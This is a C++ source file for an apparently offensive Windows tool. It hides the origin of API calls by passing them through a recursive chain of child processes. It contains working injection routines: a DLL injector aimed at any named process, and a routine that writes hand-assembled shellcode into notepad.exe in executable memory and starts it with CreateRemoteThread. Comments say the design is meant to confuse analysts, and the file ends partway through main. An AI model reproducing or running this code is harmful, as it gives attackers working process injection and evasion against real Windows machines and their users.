#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <cstdio>
#include <sstream>
#include <memory>
#include <tlhelp32.h>

#include "RecursiveDelegationCore.h"

#ifdef _DEBUG
#define DEBUG_PRINTF(...) printf(__VA_ARGS__)
#define DEBUG_COUT(x) std::cout << x
#else
#define DEBUG_PRINTF(...) do {} while (0)
#define DEBUG_COUT(x) do {} while (0)
#endif

// Assembly stub, ProcessResultAndExit, and the delegation engine (RecursiveDelegate,
// ExecuteApiCallAtLevelZero, ProcessChildMode) all live in RecursiveDelegationEngine.cpp
// and are declared in RecursiveDelegationCore.h.

void RunAllDelegationTests() {
    std::cout << "\n=============================================" << std::endl;
    std::cout << "=== STARTING ALL RECURSIVE DELEGATION TESTS ===" << std::endl;
    std::cout << "=============================================" << std::endl;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) { // Should always be loaded
        hNtdll = LoadLibraryA("ntdll.dll"); // Attempt to load if somehow not found
        if (!hNtdll) {
            std::cerr << "main: CRITICAL - Failed to load ntdll.dll. Error: " << GetLastError() << std::endl;
            return;
        }
    }

    NtContinue_t pNtContinue = (NtContinue_t)GetProcAddress(hNtdll, "NtContinue");

    // --- Test 1: VirtualAllocEx using an INHERITED OpenProcess handle ---
    std::cout << "\n--- TESTING VirtualAllocEx (Self, Inherited OpenProcess Handle) ---" << std::endl;
    HANDLE hSelfProcessInheritable = NULL;
    SECURITY_ATTRIBUTES sa_inherit_process; // Use a distinct SA struct
    sa_inherit_process.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa_inherit_process.lpSecurityDescriptor = NULL;
    sa_inherit_process.bInheritHandle = TRUE;

    hSelfProcessInheritable = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
        TRUE, // This flag on OpenProcess makes the returned handle inheritable
        GetCurrentProcessId()
    );

    if (hSelfProcessInheritable == NULL) {
        std::cerr << "TestRunner: ERROR - OpenProcess failed: " << GetLastError() << std::endl;
    }
    else {
        DEBUG_PRINTF("TestRunner: Opened inheritable handle to self: 0x%llX\n", (DWORD64)hSelfProcessInheritable);
        ApiCallResultResponse vaResponse = {};
        ApiCallParams vaParamsInherit = {};
        strncpy_s(vaParamsInherit.funcNameWithModule, "Kernel32!VirtualAllocEx", _TRUNCATE);
        vaParamsInherit.rcx_val = (DWORD64)hSelfProcessInheritable; // Use the inheritable handle
        vaParamsInherit.rdx_val = (DWORD64)NULL;
        vaParamsInherit.r8_val = 20480; // 20KB
        vaParamsInherit.r9_val = MEM_COMMIT | MEM_RESERVE;
        std::vector<DWORD64> vaStackArgsInherit;
        vaStackArgsInherit.push_back(PAGE_EXECUTE_READWRITE);

        const int vaInheritRecursionLevel = 1;
        DEBUG_COUT("TestRunner: Starting VirtualAllocEx (inherited handle) delegation. Max depth: " << vaInheritRecursionLevel << std::endl);
        DEBUG_COUT("RecursiveDelegate(vaInheritRecursionLevel, &vaParamsInherit, &vaStackArgsInherit, pNtContinue, \"default\")" << std::endl);
        bool vaInheritResult = RecursiveDelegate(vaInheritRecursionLevel, &vaParamsInherit, &vaStackArgsInherit, pNtContinue, NULL, "default", &vaResponse);
        std::cout << "TestRunner: VirtualAllocEx (Inherited Handle, Level " << vaInheritRecursionLevel << ") delegation "
            << (vaInheritResult ? "reported success via pipe" : "reported failure/pipe break") << std::endl;
        CloseHandle(hSelfProcessInheritable);
    }
    std::cout << "--- VirtualAllocEx (Inherited Handle) Test Complete ---\n" << std::endl;


    // --- Test 2: VirtualAllocEx using GetCurrentProcess() handle (different size, deeper recursion) ---
    std::cout << "\n--- TESTING VirtualAllocEx (Self, GetCurrentProcess Handle, Deeper Recursion) ---" << std::endl;
    // Re-use hSelfProcessInheritable variable name, but it's a different handle for this test
	// The pseudo-handle GetCurrentProcess() will not work as-is since its just a constant value -1 for self-reference in many WinAPI. It does not represents a real inheritable handle.
	// We can use also DuplicateHandle to create a REAL inheritable handle from the pseudo-handle GetCurrentProcess().
    HANDLE hProcess = NULL;
    DuplicateHandle(
        GetCurrentProcess(),    // Source process is the current process
        GetCurrentProcess(),    // Source handle is the pseudo-handle to the current process
        GetCurrentProcess(),    // Target process is the current process (we're making it inheritable here)
        &hProcess, // This will receive the REAL handle
        0,                      // Desired access (0 for same access as source)
        TRUE,                   // Make the new handle inheritable
        DUPLICATE_SAME_ACCESS   // Options
    );

    ApiCallParams vaParamsPseudo = {};
    ApiCallResultResponse vaResponse = {};

    strncpy_s(vaParamsPseudo.funcNameWithModule, "Kernel32!VirtualAllocEx", _TRUNCATE);
    vaParamsPseudo.rcx_val = (DWORD64)hProcess;
    vaParamsPseudo.rdx_val = (DWORD64)NULL;
    vaParamsPseudo.r8_val = (2 << 14); // 32KB
    vaParamsPseudo.r9_val = MEM_COMMIT | MEM_RESERVE;
    std::vector<DWORD64> vaStackArgsPseudo;
    vaStackArgsPseudo.push_back(PAGE_EXECUTE_READWRITE);

    const int vaPseudoRecursionLevel = 2;
    DEBUG_COUT("TestRunner: Starting VirtualAllocEx (GetCurrentProcess handle) delegation. Max depth: " << vaPseudoRecursionLevel << std::endl);
    bool vaPseudoResult = RecursiveDelegate(vaPseudoRecursionLevel, &vaParamsPseudo, &vaStackArgsPseudo, pNtContinue, NULL, "default", &vaResponse);
    std::cout << "TestRunner: VirtualAllocEx (GetCurrentProcess Handle, Level " << vaPseudoRecursionLevel << ") delegation "
        << (vaPseudoResult ? "reported success via pipe" : "reported failure/pipe break") << std::endl;
    std::cout << "--- VirtualAllocEx (GetCurrentProcess Handle) Test Complete ---\n" << std::endl;


    // --- Test 3: SetEvent with an inherited handle (deeper recursion) ---
    std::cout << "\n--- TESTING SetEvent with Inherited Handle (Deeper Recursion) ---" << std::endl;
    FARPROC pSetEvent = ResolveFunction("Kernel32!SetEvent"); // Resolve once for the test
    if (!pSetEvent) { // Check if ResolveFunction succeeded
        std::cerr << "TestRunner: ERROR - Could not resolve Kernel32!SetEvent. Skipping SetEvent test." << std::endl;
    }
    else {
        SECURITY_ATTRIBUTES sa_event;
        sa_event.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa_event.lpSecurityDescriptor = NULL;
        sa_event.bInheritHandle = TRUE;

        HANDLE hEventForChild = CreateEventA(&sa_event, TRUE, FALSE, "MyRecursiveEventTestForStub");
        if (hEventForChild == NULL) {
            std::cerr << "TestRunner: ERROR - CreateEventA failed: " << GetLastError() << std::endl;
        }
        else {
            DEBUG_PRINTF("TestRunner: Created inheritable event handle: 0x%llX\n", (DWORD64)hEventForChild);

            ApiCallParams seParams = {};
            ApiCallResultResponse vaResponse = {};

            strncpy_s(seParams.funcNameWithModule, "Kernel32!SetEvent", _TRUNCATE);
            seParams.rcx_val = (DWORD64)hEventForChild;
            std::vector<DWORD64> seStackArgs; // No stack args for SetEvent

            const int eventTestRecursionLevel = 3; // Let's try a bit deeper
            std::cout << "TestRunner: Delegating SetEvent. Parent (TestRunner) will wait on the event." << std::endl;
            bool delegateResult = RecursiveDelegate(eventTestRecursionLevel, &seParams, &seStackArgs, pNtContinue, NULL, "default", &vaResponse);

            if (delegateResult) { // This means the entire chain up to level 1 successfully got TRUE from its child
                DEBUG_COUT("TestRunner: RecursiveDelegate for SetEvent reported success indication from child pipe." << std::endl);
                DWORD waitResult = WaitForSingleObject(hEventForChild, 10000); // Wait up to 10 seconds
                if (waitResult == WAIT_OBJECT_0) {
                    std::cout << "TestRunner: SUCCESS - Event was signaled by a delegated process!" << std::endl;
                }
                else if (waitResult == WAIT_TIMEOUT) {
                    std::cout << "TestRunner: TIMEOUT - Event was NOT signaled by delegated process." << std::endl;
                }
                else {
                    std::cout << "TestRunner: ERROR - WaitForSingleObject on event failed: " << GetLastError() << std::endl;
                }
            }
            else {
                std::cout << "TestRunner: RecursiveDelegate for SetEvent reported failure/pipe issue from some child." << std::endl;
            }
            CloseHandle(hEventForChild);
        }
    }
    std::cout << "--- SetEvent Test Complete ---\n" << std::endl;
    std::cout << "\n============================================" << std::endl;
    std::cout << "=== ALL RECURSIVE DELEGATION TESTS ENDED ===" << std::endl;
    std::cout << "============================================" << std::endl;
}

int InjectDllToProcess(int recursiveDelegationLevel, const char* dllPath, const char* targetProcess) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        hNtdll = LoadLibraryA("ntdll.dll");
        if (!hNtdll) {
            std::cerr << "main: CRITICAL - Failed to load ntdll.dll. Error: " << GetLastError() << std::endl;
            return 1;
        }
    }

    NtContinue_t pNtContinue = (NtContinue_t)GetProcAddress(hNtdll, "NtContinue");

    std::cout << "\n--- DLL INJECTION ---" << std::endl;
    std::cout << "Target process: " << targetProcess << std::endl;
    std::cout << "DLL path: " << dllPath << std::endl;

    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
        std::cerr << "InjectDll: ERROR - DLL not found at: " << dllPath << std::endl;
        return 1;
    }

    int wideLen = MultiByteToWideChar(CP_ACP, 0, targetProcess, -1, NULL, 0);
    std::vector<wchar_t> wideTarget(wideLen);
    MultiByteToWideChar(CP_ACP, 0, targetProcess, -1, wideTarget.data(), wideLen);

    DWORD targetPid = FindProcessPid(wideTarget.data());
    if (targetPid == 0) {
        std::cerr << "InjectDll: Process not found: " << targetProcess << std::endl;
        return 1;
    }

    std::cout << "InjectDll: Found " << targetProcess << " at PID " << targetPid << std::endl;

    HANDLE hTarget = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        TRUE,
        targetPid
    );

    if (hTarget == NULL) {
        std::cerr << "InjectDll: OpenProcess failed for PID " << targetPid << ". Error: " << GetLastError() << std::endl;
        return 1;
    }
    DEBUG_PRINTF("InjectDll: Opened inheritable handle to %s (PID %lu): 0x%p\n", targetProcess, targetPid, hTarget);


    

    // 1. VirtualAllocEx
    ApiCallResultResponse vaResponse = {};
    ApiCallParams vaParams = {};

    strncpy_s(vaParams.funcNameWithModule, "Kernel32!VirtualAllocEx", _TRUNCATE);
	vaParams.rcx_val = (DWORD64)hTarget;
    vaParams.rdx_val = (DWORD64)NULL;
	vaParams.r8_val = strlen(dllPath) + 1;
    vaParams.r9_val = MEM_COMMIT | MEM_RESERVE;
    std::vector<DWORD64> vaStackArgs;
    vaStackArgs.push_back(PAGE_READWRITE);

    std::cout << "InjectDll: Delegating VirtualAllocEx..." << std::endl;
    DEBUG_PRINTF("InjectDll: VirtualAllocEx PARAMS: hProc=0x%llX, lpAddr=0x%llX, dwSize=0x%llX (%llu), flAlloc=0x%llX, flProt=0x%llX\n",
        vaParams.rcx_val, vaParams.rdx_val, vaParams.r8_val, vaParams.r8_val, vaParams.r9_val, vaStackArgs[0]);

    bool delegationChainSuccess = RecursiveDelegate(recursiveDelegationLevel, &vaParams, &vaStackArgs, pNtContinue, NULL, "default", &vaResponse);

    if (!delegationChainSuccess) {
        std::cerr << "InjectDll: FAILED (VirtualAllocEx delegation chain reported failure)" << std::endl;
        std::cerr << "    Response: Success=" << (vaResponse.wasApiCallConsideredSuccess ? "TRUE" : "FALSE")
            << ", RAX=0x" << std::hex << vaResponse.apiReturnValue << std::dec
            << ", ChildLE=" << vaResponse.lastErrorValue << std::endl;
        CloseHandle(hTarget);
        return 1;
    }

    DEBUG_COUT("InjectDll: VirtualAllocEx delegation chain reported success." << std::endl);
    DEBUG_PRINTF("  Actual API Result: RAX = 0x%llX, Child's GetLastError() at helper = %lu\n",
        vaResponse.apiReturnValue, vaResponse.lastErrorValue);

    if (vaResponse.apiReturnValue == 0) {
        std::cerr << "InjectDll: FAILED (VirtualAllocEx returned NULL)" << std::endl;
        std::cerr << "    Child's GetLastError(): " << vaResponse.lastErrorValue << std::endl;
        CloseHandle(hTarget);
        return 1;
    }

    DWORD64 remoteMemAddress = vaResponse.apiReturnValue;
    std::cout << "InjectDll: VirtualAllocEx successful. Remote address: 0x" << std::hex << remoteMemAddress << std::dec << std::endl;

    // 2. WriteProcessMemory
    ApiCallResultResponse wpmResponse;
    ApiCallParams wpmParams = {};
    strncpy_s(wpmParams.funcNameWithModule, "Kernel32!WriteProcessMemory", _TRUNCATE);
    wpmParams.rcx_val = (DWORD64)hTarget;
    wpmParams.rdx_val = remoteMemAddress;
    wpmParams.r9_val = strlen(dllPath) + 1;

    std::vector<DWORD64> wpmStackArgs;
    wpmStackArgs.push_back((DWORD64)NULL);        // lpNumberOfBytesWritten

    wpmParams.r8_val = (DWORD64)wpmStackArgs.size() * sizeof(DWORD64);
	wpmParams.r8_is_ptr_offset_from_stack = TRUE;
    const char* pStr = dllPath;
    size_t dllPathActualLen = strlen(dllPath) + 1;
    size_t numQwordsForDllPath = (dllPathActualLen + sizeof(DWORD64) - 1) / sizeof(DWORD64);

    char tempQwordBuffer[sizeof(DWORD64)];
    for (size_t i = 0; i < numQwordsForDllPath; ++i) {
        ZeroMemory(tempQwordBuffer, sizeof(DWORD64));
        size_t remainingBytes = dllPathActualLen - (i * sizeof(DWORD64));
        size_t bytesToCopyThisChunk = min(remainingBytes, sizeof(DWORD64));
        if (bytesToCopyThisChunk > 0) {
            memcpy(tempQwordBuffer, pStr + (i * sizeof(DWORD64)), bytesToCopyThisChunk);
        }
        wpmStackArgs.push_back(*(DWORD64*)tempQwordBuffer);
    }

    std::cout << "InjectDll: Delegating WriteProcessMemory..." << std::endl;
    DEBUG_PRINTF("InjectDll: WriteProcessMemory PARAMS: hProc=0x%llX, lpBaseAddr=0x%llX, lpBuff=0x%llX, nSize=0x%llX (%llu)\n",
        wpmParams.rcx_val, wpmParams.rdx_val, wpmParams.r8_val, wpmParams.r9_val, wpmParams.r9_val);

    delegationChainSuccess = RecursiveDelegate(recursiveDelegationLevel, &wpmParams, &wpmStackArgs, pNtContinue, NULL, "default", &wpmResponse);

    if (!delegationChainSuccess) {
        std::cerr << "InjectDll: FAILED (WriteProcessMemory delegation chain reported failure)" << std::endl;
        std::cerr << "    Response: SuccessFlag=" << (wpmResponse.wasApiCallConsideredSuccess ? "TRUE" : "FALSE")
            << ", RAX=0x" << std::hex << wpmResponse.apiReturnValue << std::dec
            << ", ChildLE=" << wpmResponse.lastErrorValue << std::endl;
        CloseHandle(hTarget);
        return 1;
    }

    DEBUG_COUT("InjectDll: WriteProcessMemory delegation chain reported success." << std::endl);
    DEBUG_PRINTF("  Actual API Result: RAX = 0x%llX, Child's GetLastError() at helper = %lu\n",
        wpmResponse.apiReturnValue, wpmResponse.lastErrorValue);

    if (wpmResponse.apiReturnValue == 0) {
        std::cerr << "InjectDll: FAILED (WriteProcessMemory returned 0)" << std::endl;
        std::cerr << "    Child's GetLastError(): " << wpmResponse.lastErrorValue << std::endl;
        CloseHandle(hTarget);
        return 1;
    }
    std::cout << "InjectDll: WriteProcessMemory successful." << std::endl;

    // 3. CreateRemoteThread
    FARPROC pLoadLibraryA = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!pLoadLibraryA) {
        std::cerr << "InjectDll: Failed to get address of LoadLibraryA. Error: " << GetLastError() << std::endl;
        CloseHandle(hTarget);
        return 1;
    }

    ApiCallResultResponse crtResponse = {};
    ApiCallParams crtParams = {};

    strncpy_s(crtParams.funcNameWithModule, "Kernel32!CreateRemoteThread", _TRUNCATE);
    crtParams.rcx_val = (DWORD64)hTarget;
    crtParams.rdx_val = (DWORD64)NULL;
    crtParams.r8_val = 0;
    crtParams.r9_val = (DWORD64)pLoadLibraryA;
    std::vector<DWORD64> crtStackArgs;
    crtStackArgs.push_back(remoteMemAddress);
    crtStackArgs.push_back(0);
    crtStackArgs.push_back((DWORD64)NULL);

    std::cout << "InjectDll: Delegating CreateRemoteThread..." << std::endl;
    DEBUG_PRINTF("InjectDll: CreateRemoteThread PARAMS: hProc=0x%llX, lpStartAddr=0x%llX, lpParam=0x%llX\n",
        crtParams.rcx_val, crtParams.r9_val, crtStackArgs[0]);

    delegationChainSuccess = RecursiveDelegate(recursiveDelegationLevel, &crtParams, &crtStackArgs, pNtContinue, NULL, "default", &crtResponse);

    if (!delegationChainSuccess) {
        std::cerr << "InjectDll: FAILED (CreateRemoteThread delegation chain reported failure)" << std::endl;
        std::cerr << "    Response: SuccessFlag=" << (crtResponse.wasApiCallConsideredSuccess ? "TRUE" : "FALSE")
            << ", RAX=0x" << std::hex << crtResponse.apiReturnValue << std::dec
            << ", ChildLE=" << crtResponse.lastErrorValue << std::endl;
        CloseHandle(hTarget);
        return 1;
    }

    DEBUG_COUT("InjectDll: CreateRemoteThread delegation chain reported success." << std::endl);
    DEBUG_PRINTF("  Actual API Result: RAX = 0x%llX (Thread Handle), Child's GetLastError() at helper = %lu\n",
        crtResponse.apiReturnValue, crtResponse.lastErrorValue);

    if (crtResponse.apiReturnValue == 0) {
        std::cerr << "InjectDll: FAILED (CreateRemoteThread returned NULL)" << std::endl;
        std::cerr << "    Child's GetLastError(): " << crtResponse.lastErrorValue << std::endl;
        CloseHandle(hTarget);
        return 1;
    }

    HANDLE hRemoteThread = (HANDLE)crtResponse.apiReturnValue;
    std::cout << "InjectDll: CreateRemoteThread successful. Remote thread handle: 0x" << std::hex << (DWORD64)hRemoteThread << std::dec << std::endl;
    std::cout << "InjectDll: Waiting for remote thread to complete (max 10s)..." << std::endl;

    DWORD waitResult = WaitForSingleObject(hRemoteThread, 10000);
    if (waitResult == WAIT_OBJECT_0) {
        std::cout << "InjectDll: Remote thread finished." << std::endl;
    }
    else if (waitResult == WAIT_TIMEOUT) {
        std::cout << "InjectDll: Remote thread timed out." << std::endl;
    }
    else {
        std::cerr << "InjectDll: WaitForSingleObject failed. Error: " << GetLastError() << std::endl;
    }

    std::cout << "--- DLL Injection into " << targetProcess << " complete ---" << std::endl;

    return 0;
}

int InjectShellcodeToNotepadTest(int recursiveDelegationLevel) {

    std::cout << "\n--- TESTING NOTEPAD SHELLCODE INJECTION ---" << std::endl;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) { // Should always be loaded
        hNtdll = LoadLibraryA("ntdll.dll"); // Attempt to load if somehow not found
        if (!hNtdll) {
            std::cerr << "main: CRITICAL - Failed to load ntdll.dll. Error: " << GetLastError() << std::endl;
            return 1;
        }
    }

    NtContinue_t pNtContinue = (NtContinue_t)GetProcAddress(hNtdll, "NtContinue");

    unsigned char shellcode[] = {
        /* 00 */ 0x48, 0x83, 0xEC, 0x28,                    // sub  rsp, 28h
        /* 04 */ 0x48, 0x31, 0xC9,                          // xor  rcx, rcx        ; hWnd = NULL
        /* 07 */ 0x48, 0x8D, 0x15, 0x23, 0x00, 0x00, 0x00,  // lea  rdx,[rip+23h]   ; lpText ("Hello from...")
        /* 0E */ 0x4C, 0x8D, 0x05, 0x3B, 0x00, 0x00, 0x00,  // lea  r8, [rip+3Bh]   ; lpCaption ("Injected")
        /* 15 */ 0x41, 0xB9, 0x00, 0x00, 0x00, 0x00,        // mov  r9d,0          ; MB_OK
        /* 1B */ 0x48, 0x8B, 0x05, 0x07, 0x00, 0x00, 0x00,  // mov  rax,[rip+7]    ; &MessageBoxA placeholder
        /* 22 */ 0xFF, 0xD0,                                // call rax
        /* 24 */ 0x48, 0x83, 0xC4, 0x28,                    // add  rsp, 28h
        /* 28 */ 0xC3,                                      // ret
        /* 29 .dq */ 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,   // QWORD for &MessageBoxA to be patched
        /* 31 .db */ 'H','e','l','l','o',' ','f','r','o','m',' ',
                     'i','n','j','e','c','t','e','d',' ',
                     's','h','e','l','l','c','o','d','e','!','\0', // Null-terminated string 1
                     /* 50 .db */ 'I','n','j','e','c','t','e','d','\0'          // Null-terminated string 2
                     // Make sure sizeof(shellcode) is correct for all these bytes.
                     // String 1 length: 30 + 1 null = 31 bytes (0x1F)
                     // String 2 length: 8 + 1 null = 9 bytes (0x09)
                     // Code before placeholder: 0x29 bytes
                     // Placeholder: 8 bytes
                     // Total: 0x29 (41) + 8 + 31 + 9 = 41 + 8 + 40 = 89 bytes (0x59)
                     // If the array definition is just as above, sizeof() will get it right.
    };

    // 1. Patch MessageBoxA address in our local copy of the shellcode
    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    if (!hUser32) {
        LoadLibraryA("user32.dll"); // Ensure user32.dll is loaded
        hUser32 = GetModuleHandleA("user32.dll");
    }
    if (!hUser32) {
        std::cerr << "ShellcodeInjectionTest: Failed to get/load user32.dll. Error: " << GetLastError() << std::endl;
        return 1;
    }
    FARPROC pMessageBoxA = GetProcAddress(hUser32, "MessageBoxA");
    if (!pMessageBoxA) {
        std::cerr << "ShellcodeInjectionTest: Failed to get MessageBoxA address. Error: " << GetLastError() << std::endl;
        return 1;
    }
    // Patch address at offset 0x29 (index of the QWORD placeholder)
    *reinterpret_cast<void**>(shellcode + 0x29) = pMessageBoxA;
    DEBUG_PRINTF("ShellcodeInjectionTest: Patched local shellcode with MessageBoxA at 0x%p\n", pMessageBoxA);


    // 2. Find Notepad
    DWORD notepadPid = FindProcessPid(L"notepad.exe"); // Assuming FindProcessPid takes wchar_t
    if (notepadPid == 0) {
        std::cout << "--- Notepad Shellcode Injection Test FAILED (Notepad not found) ---" << std::endl;
        return 1;
    }

    HANDLE hNotepad = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        TRUE,
        notepadPid
    );
    if (hNotepad == NULL) {
        std::cerr << "ShellcodeInjectionTest: OpenProcess failed for PID " << notepadPid << ". Error: " << GetLastError() << std::endl;
        return 1;
    }
    DEBUG_PRINTF("ShellcodeInjectionTest: Opened inheritable handle to notepad.exe (PID %lu): 0x%p\n", notepadPid, hNotepad);


    // 3. VirtualAllocEx in Notepad for the shellcode
    ApiCallResultResponse vaResponse = {};
    ApiCallParams vaParams = {};

    strncpy_s(vaParams.funcNameWithModule, "Kernel32!VirtualAllocEx", _TRUNCATE);
    vaParams.rcx_val = (DWORD64)hNotepad;
    vaParams.rdx_val = (DWORD64)NULL;           // Let system choose address
    vaParams.r8_val = sizeof(shellcode);        // Size of the shellcode
    vaParams.r9_val = MEM_COMMIT | MEM_RESERVE;
    std::vector<DWORD64> vaStackArgs;
    vaStackArgs.push_back(PAGE_EXECUTE_READWRITE); // <<<< EXECUTE permission needed for shellcode

    std::cout << "ShellcodeInjectionTest: Delegating VirtualAllocEx for shellcode..." << std::endl;
    DEBUG_PRINTF("InjectShellcodeToNotepadTest: VirtualAllocEx PARAMS: hProc=0x%llX, lpAddr=0x%llX, dwSize=0x%llX (%llu), flAlloc=0x%llX, flProt=0x%llX\n",
        vaParams.rcx_val, vaParams.rdx_val, vaParams.r8_val, vaParams.r8_val, vaParams.r9_val, vaStackArgs[0]);

    bool delegationChainSuccess = RecursiveDelegate(recursiveDelegationLevel, &vaParams, &vaStackArgs, pNtContinue, NULL, "default", &vaResponse);

    if (!delegationChainSuccess || vaResponse.apiReturnValue == 0) {
        std::cerr << "--- Notepad Shellcode Injection Test FAILED (VirtualAllocEx "
            << (!delegationChainSuccess ? "delegation chain" : "API call")
            << " failed) ---" << std::endl;
        std::cerr << "    Response: SuccessFlag=" << (vaResponse.wasApiCallConsideredSuccess ? "TRUE" : "FALSE")
            << ", RAX=0x" << std::hex << vaResponse.apiReturnValue << std::dec
            << ", ChildLE=" << vaResponse.lastErrorValue << std::endl;
        CloseHandle(hNotepad);
        return 1;
    }

    DWORD64 remoteShellcodeMemAddress = vaResponse.apiReturnValue;
    std::cout << "ShellcodeInjectionTest: VirtualAllocEx for shellcode successful. Remote address: 0x" << std::hex << remoteShellcodeMemAddress << std::dec << std::endl;


    // 4. WriteProcessMemory to write the shellcode into Notepad
    ApiCallResultResponse wpmResponse = {};
    ApiCallParams wpmParams = {};

    strncpy_s(wpmParams.funcNameWithModule, "Kernel32!WriteProcessMemory", _TRUNCATE);
    wpmParams.rcx_val = (DWORD64)hNotepad;
    wpmParams.rdx_val = remoteShellcodeMemAddress; // Target address in Notepad
    // R8 (lpBuffer) will point to shellcode data on the delegator's stack
    wpmParams.r9_val = sizeof(shellcode);          // nSize

    wpmParams.r8_is_ptr_offset_from_stack = TRUE;

    std::vector<DWORD64> wpmStackData;
    wpmStackData.push_back((DWORD64)NULL); // Placeholder for lpNumberOfBytesWritten (5th API arg)

    // Set r8_val to be the byte offset to where shellcode data will start in wpmStackData's layout
    wpmParams.r8_val = wpmStackData.size() * sizeof(DWORD64); // Should be 8 (pointing to 6th API arg at wpmStackData[1])

    // Serialize shellcode into QWORDs and append to wpmStackData
    const unsigned char* pSc = shellcode;
    size_t shellcodeActualLen = sizeof(shellcode);
    size_t numQwordsForShellcode = (shellcodeActualLen + sizeof(DWORD64) - 1) / sizeof(DWORD64);

    char tempQwordBuffer[sizeof(DWORD64)];
    for (size_t i = 0; i < numQwordsForShellcode; ++i) {
        ZeroMemory(tempQwordBuffer, sizeof(DWORD64));
        size_t remainingBytes = shellcodeActualLen - (i * sizeof(DWORD64));
        size_t bytesToCopyThisChunk = min(remainingBytes, sizeof(DWORD64));
        if (bytesToCopyThisChunk > 0) {
            memcpy(tempQwordBuffer, pSc + (i * sizeof(DWORD64)), bytesToCopyThisChunk);
        }
        wpmStackData.push_back(*(DWORD64*)tempQwordBuffer);
    }

    std::cout << "ShellcodeInjectionTest: Delegating WriteProcessMemory for shellcode..." << std::endl;
    DEBUG_PRINTF("InjectShellcodeToNotepadTest: WriteProcessMemory PARAMS: hProc=0x%llX, lpBaseAddr=0x%llX, (R8 from stack byte offset %llu), nSize=0x%llX (%llu)\n",
        wpmParams.rcx_val, wpmParams.rdx_val, wpmParams.r8_val, wpmParams.r9_val, wpmParams.r9_val);

    delegationChainSuccess = RecursiveDelegate(recursiveDelegationLevel, &wpmParams, &wpmStackData, pNtContinue, NULL, "default", &wpmResponse);

    if (!delegationChainSuccess || wpmResponse.apiReturnValue == 0) {
        std::cerr << "--- Notepad Shellcode Injection Test FAILED (WriteProcessMemory "
            << (!delegationChainSuccess ? "delegation chain" : "API call")
            << " failed) ---" << std::endl;
        std::cerr << "    Response: SuccessFlag=" << (wpmResponse.wasApiCallConsideredSuccess ? "TRUE" : "FALSE")
            << ", RAX=0x" << std::hex << wpmResponse.apiReturnValue << std::dec
            << ", ChildLE=" << wpmResponse.lastErrorValue << std::endl;
        return 1;
    }
    std::cout << "ShellcodeInjectionTest: WriteProcessMemory for shellcode successful." << std::endl;


    // 5. CreateRemoteThread in Notepad to execute the shellcode
    ApiCallResultResponse crtResponse = {};
    ApiCallParams crtParams = {};

    strncpy_s(crtParams.funcNameWithModule, "Kernel32!CreateRemoteThread", _TRUNCATE);
    crtParams.rcx_val = (DWORD64)hNotepad;
    crtParams.rdx_val = (DWORD64)NULL;              // lpThreadAttributes
    crtParams.r8_val = 0;                           // dwStackSize
    crtParams.r9_val = remoteShellcodeMemAddress;   // <<<< lpStartAddress is the shellcode address
    std::vector<DWORD64> crtStackArgs;
    crtStackArgs.push_back((DWORD64)NULL);          // lpParameter (NULL for this shellcode)
    crtStackArgs.push_back(0);                      // dwCreationFlags
    crtStackArgs.push_back((DWORD64)NULL);          // lpThreadId

    std::cout << "ShellcodeInjectionTest: Delegating CreateRemoteThread for shellcode..." << std::endl;
    DEBUG_PRINTF("InjectShellcodeToNotepadTest: CreateRemoteThread PARAMS: hProc=0x%llX, lpStartAddr=0x%llX, lpParam=0x%llX\n",
        crtParams.rcx_val, crtParams.r9_val, crtStackArgs[0]);

    delegationChainSuccess = RecursiveDelegate(recursiveDelegationLevel, &crtParams, &crtStackArgs, pNtContinue, NULL, "default", &crtResponse);

    if (!delegationChainSuccess || crtResponse.apiReturnValue == 0) {
        std::cerr << "--- Notepad Shellcode Injection Test FAILED (CreateRemoteThread "
            << (!delegationChainSuccess ? "delegation chain" : "API call")
            << " failed) ---" << std::endl;
        std::cerr << "    Response: SuccessFlag=" << (crtResponse.wasApiCallConsideredSuccess ? "TRUE" : "FALSE")
            << ", RAX=0x" << std::hex << crtResponse.apiReturnValue << std::dec
            << ", ChildLE=" << crtResponse.lastErrorValue << std::endl;
        CloseHandle(hNotepad);
        return 1;
    }

    HANDLE hRemoteThread = (HANDLE)crtResponse.apiReturnValue;
    std::cout << "ShellcodeInjectionTest: CreateRemoteThread for shellcode successful. Remote thread handle (at executor process): 0x" << std::hex << (DWORD64)hRemoteThread << std::dec << std::endl;

    std::cout << "--- Notepad Shellcode Injection Test Complete (check for MessageBox) ---" << std::endl;
    return 0;
}

int main(int argc, char* argv[]) {
	int recursiveDelegationLevel = 2; // We could also randomize this per function delegation call to give extra fun for analysts
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) { // Should always be loaded
        hNtdll = LoadLibraryA("ntdll.dll"); // Attempt to load if somehow not found
        if (!hNtdll) {
            std::cerr << "main: CRITICAL - Failed to load ntdll.dll. Error: " << GetLastError() << std::endl;
            return 1;
        }
    }

    NtContinue_t pNtContinue = (NtContinue_t)GetProcAddress(hNtdll, "NtContinue");
    FARPROC pExitThread = GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExitThread");
    FARPROC pAsmStub = (FARPROC)CaptureRAX_And_CallHelper;

    // Create a shared MMF to share data with child processes for APIs requiring pointers to raw data
    // Imagine if we just passed response directly to the root parent like this instead of recursively with pipes lol so much headache saved...
    // In the end we place data on stack arguments in chunk and referense them as offsets to be fixed into absolute addresses because we're not PUSSIES and
	// also because we want to try and keep the relationship between the executor process and the root delegator process as a full arbitrary long chain with no shortcuts.
